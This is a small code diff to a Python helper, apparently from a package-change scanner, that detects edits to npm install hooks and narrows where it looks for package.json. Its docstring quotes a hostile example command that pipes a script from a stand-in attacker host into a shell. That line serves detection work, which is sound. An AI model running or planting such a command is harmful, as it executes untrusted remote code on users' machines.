@@ -117,7 +117,7 @@ def _inject_npm_script_synthetic(files: dict[str, bytes | None]) -> None:
     Inserts npm:scripts/<hook> entries with the script command as content so the
     diff can detect a postinstall change like 'curl evil.com | sh'.
     """
-    pkg_path = next((p for p in files if p.endswith("package.json")), None)
+    pkg_path = "package/package.json" if "package/package.json" in files else None
     if pkg_path is None:
         return
     blob = files.get(pkg_path)
